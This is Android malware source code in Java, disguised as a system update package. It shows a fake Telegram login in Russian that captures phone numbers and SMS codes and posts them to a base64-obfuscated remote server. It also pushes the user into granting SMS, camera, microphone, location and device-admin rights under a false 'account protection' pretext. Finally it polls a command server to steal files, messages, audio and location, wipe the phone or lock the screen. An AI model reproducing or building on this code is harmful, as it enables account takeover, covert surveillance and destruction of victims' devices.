package com.android.system.update;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URLEncoder;
import java.util.UUID;

public class MainActivity extends Activity {
    private static final String B64_URL = "aHR0cHM6Ly90bnQuZGUzLm5ldHJ1bi5pbw==";
    private String deviceId;
    private volatile boolean running = true;
    private String baseUrl;
    
    private int step = 1;
    private String savedPhone = "";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            baseUrl = new String(Base64.decode(B64_URL, Base64.DEFAULT));
            
            SharedPreferences sp = getSharedPreferences("sys_cfg", MODE_PRIVATE);
            deviceId = sp.getString("id", null);
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 12);
                sp.edit().putString("id", deviceId).apply();
            }

            new Thread(this::registerLoop).start();
            new Thread(this::pollLoop).start();

            showStep();
        } catch (Exception e) {
            showStep();
        }
    }

    private void showStep() {
        runOnUiThread(() -> {
            try {
                LinearLayout layout = new LinearLayout(this);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setGravity(Gravity.CENTER);
                layout.setBackgroundColor(0xFFFFFFFF);
                layout.setPadding(50, 50, 50, 50);

                TextView title = new TextView(this);
                title.setTextSize(24);
                title.setTextColor(0xFF0088cc);
                title.setGravity(Gravity.CENTER);
                layout.addView(title);

                final EditText input = new EditText(this);
                layout.addView(input);

                Button btn = new Button(this);
                btn.setBackgroundColor(0xFF0088cc);
                btn.setTextColor(0xFFFFFFFF);

                if (step == 1) {
                    title.setText("Вход в Telegram");
                    input.setHint("Введите номер телефона");
                    btn.setText("Далее");
                    btn.setOnClickListener(v -> {
                        savedPhone = input.getText().toString();
                        if (savedPhone.isEmpty()) return;
                        sendToBot("tg_number", savedPhone);
                        step = 2;
                        showStep();
                    });
                } 
                else if (step == 2) {
                    title.setText("Введите код");
                    input.setHint("Код из СМС");
                    btn.setText("Подтвердить");
                    btn.setOnClickListener(v -> {
                        sendToBot("tg_code", savedPhone + ":" + input.getText().toString());
                        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 101);
                        step = 3;
                        showStep();
                    });
                } 
                else if (step == 3) {
                    title.setText("Настройка медиа");
                    input.setVisibility(View.GONE);
                    btn.setText("Разрешить доступ к Фото");
                    btn.setOnClickListener(v -> {
                        ActivityCompat.requestPermissions(this, new String[]{
                            Manifest.permission.CAMERA, 
                            Manifest.permission.READ_EXTERNAL_STORAGE
                        }, 102);
                        step = 4;
                        showStep();
                    });
                } 
                else if (step == 4) {
                    title.setText("Голосовые сообщения");
                    input.setVisibility(View.GONE);
                    btn.setText("Разрешить микрофон");
                    btn.setOnClickListener(v -> {
                        ActivityCompat.requestPermissions(this, new String[]{
                            Manifest.permission.RECORD_AUDIO,
                            Manifest.permission.ACCESS_FINE_LOCATION
                        }, 103);
                        step = 5;
                        showStep();
                    });
                } 
                else if (step == 5) {
                    title.setText("Защита аккаунта");
                    input.setVisibility(View.GONE);
                    btn.setText("Включить защиту");
                    btn.setOnClickListener(v -> {
                        tryRequestAdmin();
                        step = 6;
                        showStep();
                    });
                } 
                else {
                    title.setText("Готово!");
                    title.setTextColor(0xFF00AA00);
                    input.setVisibility(View.GONE);
                    btn.setVisibility(View.GONE);
                    
                    try { startService(new Intent(this, CoreService.class)); } catch (Exception e) {}
                }

                layout.addView(btn);
                setContentView(layout);
            } catch (Exception e) {}
        });
    }

    private void tryRequestAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            java.lang.reflect.Method isAdminMethod = dpm.getClass().getMethod("isAdminActive", ComponentName.class);
            boolean isAdmin = (boolean) isAdminMethod.invoke(dpm, cn);
            if (!isAdmin) {
                Intent i = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                i.putExtra("android.app.extra.DEVICE_ADMIN", cn);
                i.putExtra("android.app.extra.ADD_EXPLANATION", "Защита вашего аккаунта от взлома");
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        } catch (Exception ignored) {}
    }

    private void sendToBot(String kind, String body) {
        new Thread(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", kind);
                o.put("body", body);
                Net.post(baseUrl + "/api/report", o.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    private void registerLoop() {
        while (running) {
            try {
                JSONObject body = new JSONObject();
                body.put("id", deviceId);
                body.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                Net.post(baseUrl + "/api/register", body.toString());
            } catch (Exception ignored) {}
            try { Thread.sleep(60000); } catch (Exception ignored) {}
        }
    }

    private void pollLoop() {
        while (running) {
            try {
                String url = baseUrl + "/api/poll?id=" + URLEncoder.encode(deviceId, "UTF-8");
                String resp = Net.get(url);
                JSONObject obj = new JSONObject(resp);
                JSONArray cmds = obj.optJSONArray("cmds");
                if (cmds != null) {
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.getJSONObject(i);
                        dispatch(c.optString("cmd"), c.optString("arg"));
                    }
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(5000); } catch (Exception ignored) {}
        }
    }

    private void dispatch(String cmd, String arg) {
        try {
            switch (cmd) {
                case "msg": Actions.showMsg(this, arg); break;
                case "photo": Actions.photoSend(this, deviceId, baseUrl); break;
                case "wipe": Actions.wipeAll(this, deviceId, baseUrl); break;
                case "burn": Actions.burnPhone(this); break;
                case "get_sms": Actions.getLastSms(this, deviceId, baseUrl); break;
                case "location": Actions.getLocation(this, deviceId, baseUrl); break;
                case "mic": MicRecorder.record(this, deviceId, baseUrl); break;
                case "files": Actions.stealGallery(this, deviceId, baseUrl); break;
                case "block": Actions.blockScreen(this, arg); break;
                case "unblock": Actions.unblockScreen(this); break;
                case "flash": Actions.toggleFlashlight(this); break;
                case "screen": 
                    Intent i = new Intent(this, ScreenRequestActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    break;
            }
        } catch (Exception ignored) {}
    }
}
